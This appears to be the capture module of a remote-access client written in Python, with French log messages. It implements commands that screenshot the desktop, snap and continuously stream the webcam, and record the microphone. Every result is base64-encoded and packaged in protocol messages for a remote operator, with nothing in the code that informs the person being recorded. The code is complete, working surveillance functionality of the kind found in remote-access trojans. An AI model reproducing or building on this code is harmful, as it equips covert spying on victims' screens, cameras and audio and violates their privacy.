import base64
import io
import json
import time
import threading

from src.utils.logger import setup_logger
from src.utils.protocol import make_msg, OP_RESP, OP_ERROR, OP_DATA, OP_STREAM, OP_STREAM_END

log = setup_logger("cmd.capture")

_stream_running = False
_stream_lock = threading.Lock()


def cmd_screenshot():
    try:
        import mss
        import mss.tools

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            img = sct.grab(monitor)
            buf = io.BytesIO()
            mss.tools.to_png(img.rgb, img.size, output=buf)
            b64 = base64.b64encode(buf.getvalue()).decode()
        fname = f"screenshot_{int(time.time())}.png"
        return json.dumps({"op": OP_DATA, "data": b64, "filename": fname}).encode()
    except Exception as e:
        log.error(f"Erreur screenshot mss: {e}")
        try:
            from PIL import ImageGrab

            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            b64 = base64.b64encode(buf.getvalue()).decode()
            fname = f"screenshot_{int(time.time())}.png"
            return json.dumps({"op": OP_DATA, "data": b64, "filename": fname}).encode()
        except Exception as e2:
            log.error(f"Fallback PIL echoue: {e2}")
            return make_msg(OP_ERROR, payload=str(e2))


def cmd_webcam_snapshot():
    try:
        import cv2

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return make_msg(OP_ERROR, payload="Impossible d'ouvrir la webcam")

        ret, frame = cap.read()
        cap.release()

        if not ret:
            return make_msg(OP_ERROR, payload="Capture webcam echouee")

        _, buf = cv2.imencode(".jpg", frame)
        b64 = base64.b64encode(buf.tobytes()).decode()
        fname = f"webcam_{int(time.time())}.jpg"
        return json.dumps({"op": OP_DATA, "data": b64, "filename": fname}).encode()
    except Exception as e:
        log.error(f"Erreur webcam_snapshot: {e}")
        return make_msg(OP_ERROR, payload=str(e))


def cmd_webcam_stream(send_fn):
    global _stream_running

    try:
        import cv2
    except ImportError:
        send_fn(make_msg(OP_ERROR, payload="OpenCV non installe"))
        send_fn(make_msg(OP_STREAM_END))
        return

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        send_fn(make_msg(OP_ERROR, payload="Impossible d'ouvrir la webcam"))
        send_fn(make_msg(OP_STREAM_END))
        return

    with _stream_lock:
        _stream_running = True

    try:
        while _stream_running:
            ret, frame = cap.read()
            if not ret:
                log.warning("Lecture webcam echouee, arret du stream")
                break
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            b64 = base64.b64encode(buf.tobytes()).decode()
            msg = json.dumps({"op": OP_STREAM, "data": b64}).encode()
            send_fn(msg)
            time.sleep(0.1)
    except Exception as e:
        log.error(f"Erreur stream: {e}")
        send_fn(make_msg(OP_ERROR, payload=str(e)))
    finally:
        cap.release()
        send_fn(make_msg(OP_STREAM_END))


def stop_stream():
    global _stream_running
    with _stream_lock:
        _stream_running = False


def cmd_record_audio(duration):
    try:
        import sounddevice as sd
        import scipy.io.wavfile as wav

        sample_rate = 44100
        log.info(f"Enregistrement audio {duration}s...")
        audio = sd.rec(
            int(duration * sample_rate),
            samplerate=sample_rate,
            channels=1,
            dtype="int16",
        )
        sd.wait()

        buf = io.BytesIO()
        wav.write(buf, sample_rate, audio)
        b64 = base64.b64encode(buf.getvalue()).decode()
        fname = f"audio_{int(time.time())}.wav"
        return json.dumps({"op": OP_DATA, "data": b64, "filename": fname}).encode()
    except Exception as e:
        log.error(f"Erreur record_audio: {e}")
        return make_msg(OP_ERROR, payload=str(e))
